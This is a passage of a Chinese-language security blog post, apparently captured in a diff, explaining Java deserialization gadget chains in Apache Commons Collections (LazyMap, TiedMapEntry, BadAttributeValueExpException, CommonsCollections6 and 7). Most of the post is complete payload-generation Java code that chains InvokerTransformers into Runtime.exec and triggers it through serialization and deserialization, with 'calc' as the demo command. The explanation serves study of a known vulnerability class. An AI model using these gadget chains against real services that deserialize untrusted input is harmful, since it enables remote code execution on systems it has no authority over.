+    }</code></pre><p>它的 get() 方法在 map 中不包含参数 key 时会去调用 factory 工厂变量的 transform() 方法，开始了调用链执行。</p><p>漏洞产因知道了，触发条件就是自动调用 LazyMap.get()。</p><p>正好 <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 这个类符合条件。</p><p>它有一个 map 属性，会在 toString() 、hashCode() 的时候去调用 getValue() 方法，getValue 方法又会去调用 map 属性的 get() 方法。</p><pre><code>public Object getValue() {
+        return this.map.get(this.key);
+}</code></pre><p>所以可以这样构造</p><pre><code>
+        final String[] execArgs = new String[] { &quot;calc&quot; };
+
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, execArgs),
+                new ConstantTransformer(1) };
+
+        final Transformer transformerChain = new ChainedTransformer(transformers);
+
+        final Map innerMap = new HashMap();
+
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</code></pre><p>当执行了以下方法时就会被触发</p><pre><code>entry.toString();
+entry.hashCode();
+System.out.println(entry);</code></pre><p>这种场景还是很比较常见的，但还是不能完美的做到在反序列化的时候触发。</p><p>在 JDK 1.8 的 <code>BadAttributeValueExpException</code> 异常类正好符合所有条件。</p><p>看一下他是怎么做到自动触发的。</p><pre><code>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        ObjectInputStream.GetField gf = ois.readFields();
+        Object valObj = gf.get(&quot;val&quot;, null);
+
+        if (valObj == null) {
+            val = null;
+        } else if (valObj instanceof String) {
+            val= valObj;
+        } else if (System.getSecurityManager() == null
+                || valObj instanceof Long
+                || valObj instanceof Integer
+                || valObj instanceof Float
+                || valObj instanceof Double
+                || valObj instanceof Byte
+                || valObj instanceof Short
+                || valObj instanceof Boolean) {
+            val = valObj.toString();
+        } else { // the serialized object is from a version without JDK-8019292 fix
+            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
+        }
+    }</code></pre><p>在反序列化的时候 会去调用 valObj 变量的 toString 方法<br>valObj 是当前对象的 val 属性。</p><p>根据我刚才给出的 payload 生成代码，可以构造出一个符合要求的 BadAttributeValueExpException ，当该对象被反序列化时就会自动执行命令。</p><h2>CommonsCollections6</h2><pre><code>public static Serializable getHashSet(final String command) throws Exception {
+
+        final String[] execArgs = new String[] { command };
+
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, execArgs),
+                new ConstantTransformer(1) };
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        final Map innerMap = new HashMap();
+
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);
+
+        HashSet map = new HashSet(1);
+        map.add(&quot;foo&quot;);
+        Field f = null;
+        try {
+            f = HashSet.class.getDeclaredField(&quot;map&quot;);
+        } catch (NoSuchFieldException e) {
+            f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);
+        }
+
+        f.setAccessible(true);
+        HashMap innimpl = (HashMap) f.get(map);
+
+        Field f2 = null;
+        try {
+            f2 = HashMap.class.getDeclaredField(&quot;table&quot;);
+        } catch (NoSuchFieldException e) {
+            f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);
+        }
+
+        f2.setAccessible(true);
+        Object[] array = (Object[]) f2.get(innimpl);
+
+        Object node = array[0];
+        if(node == null){
+            node = array[1];
+        }
+
+        Field keyField = null;
+        try{
+            keyField = node.getClass().getDeclaredField(&quot;key&quot;);
+        }catch(Exception e){
+            keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);
+        }
+
+        keyField.setAccessible(true);
+        keyField.set(node, entry);
+
+        return map;
+
+    }
+
+
+    public static void main(String[] args) throws Exception {
+
+        Serializable calc = getHashSet(&quot;calc&quot;);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(calc);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject();
+
+    }</code></pre><p>问题出在 HashSet 反序列化的时候。</p><p>这个过程就比较繁杂了，我直接放上一个调用栈。</p><p><img src="/usr/uploads/2019/06/4004173399.jpg" alt="1561536170(1).jpg" title="1561536170(1).jpg"></p><p>之前提到过 <code>TiedMapEntry </code> 这个类一旦被调用了 hashCode 方法就会触发。</p><p>是在 <code>put:611, HashMap (java.util)</code> 这里发生的，反序列化时添加数据会对 Key 进行一次 hash 运算，其中调用了 hashCode 方法</p><h2>CommonsCollections7</h2><p>CommonsCollections7 也是可以在 jdk1.8 平台上执行的。</p><p>这里给出我生成 payload 的代码。</p><pre><code>public static Hashtable getHashtable(final String command) throws Exception {
+
+        // Reusing transformer chain and LazyMap gadgets from previous payloads
+        final String[] execArgs = new String[]{command};
+
+        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
+
+        final Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,
+                        new Class[]{String.class, Class[].class},
+                        new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;,
+                        new Class[]{Object.class, Object[].class},
+                        new Object[]{null, new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[]{String.class},
+                        execArgs),
+                new ConstantTransformer(1)};
+
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
+        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+        lazyMap1.put(&quot;yy&quot;, 1);
+
+        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+        lazyMap2.put(&quot;zZ&quot;, 1);
+
+        // Use the colliding Maps as keys in Hashtable
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
+
+        Class&lt;? extends Transformer&gt; aClass = transformerChain.getClass();
+
+        Field iTransformers = aClass.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(transformerChain,transformers);
+
+        // Needed to ensure hash collision after previous manipulations
+        lazyMap2.remove(&quot;yy&quot;);
+
+        return hashtable;
+    }
+
+    public static void main(String[] args) throws Exception {
+
+
+        Hashtable calc = getHashtable(&quot;calc&quot;);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(calc);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject();
+
+    }</code></pre><p>关键点在 <code>Hashtable</code> ，在 <code>Hashtable</code> 的 <code>readObject</code> 方法里有这样一段代码</p><pre><code>for (; elements &gt; 0; elements--) {
+            @SuppressWarnings(&quot;unchecked&quot;)
+                K key = (K)s.readObject();
+            @SuppressWarnings(&quot;unchecked&quot;)
+                V value = (V)s.readObject();
+            // sync is eliminated for performance
+            reconstitutionPut(table, key, value);
+        }</code></pre><p>他去遍历了 hashtable 的元素并执行了 reconstitutionPut() 方法</p><pre><code>private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)
+        throws StreamCorruptedException
+    {
+        if (value == null) {
+            throw new java.io.StreamCorruptedException();
+        }
+        // Makes sure the key is not already in the hashtable.
+        // This should not happen in deserialized version.
+        int hash = key.hashCode();
+        int index = (hash &amp; 0x7FFFFFFF) % tab.length;
+        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {
+            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) {  // 关键代码
+                throw new java.io.StreamCorruptedException();
+            }
+        }
+        // Creates the new entry.
+        @SuppressWarnings(&quot;unchecked&quot;)
+            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];
+        tab[index] = new Entry&lt;&gt;(hash, key, value, e);
+        count++;
+    }</code></pre><p>在 for 循环里的 if 表达式中他调用了 Entry 键对象的 equals 方法</p><p>LazyMap 里没有 <code>equals</code>, 所以到了<code>AbstractMapDecorator</code>的 <code>equals</code>方法里。</p><p>这里他判断如果 equals() 方法传来的对象和当前对象不相等则调用 map 属性的 equals</p><p>map 是个 hashmap 它去调用了 abstractMap 的方法</p><pre><code>public boolean equals(Object o) {
+        if (o == this)
+            return true;
+
+        if (!(o instanceof Map))
+            return false;
+        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
+        if (m.size() != size())
+            return false;
+
+        try {
+            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+            while (i.hasNext()) {
+                Entry&lt;K,V&gt; e = i.next();
+                K key = e.getKey();
+                V value = e.getValue();
+                if (value == null) {
+                    if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))
+                        return false;
+                } else {
+                    if (!value.equals(m.get(key))) //在这一步调用了 lazyMap 的 get 方法
+                        return false;
+                }
+            }
+        } catch (ClassCastException unused) {
+            return false;
+        } catch (NullPointerException unused) {
+            return false;
+        }
+
+        return true;
+    }</code></pre><pre><code>    public Object get(Object key) {
+        if (!super.map.containsKey(key)) {
+            Object value = this.factory.transform(key); //触发漏洞
+            super.map.put(key, value);
+            return value;
+        } else {
+            return super.map.get(key);
+        }
+    }</code></pre><h1>参考</h1><p><a href="https://xz.aliyun.com/t/4711" target="_blank">浅显易懂的JAVA反序列化入门 </a></p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-166" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/166.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/166.html#respond-post-166" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
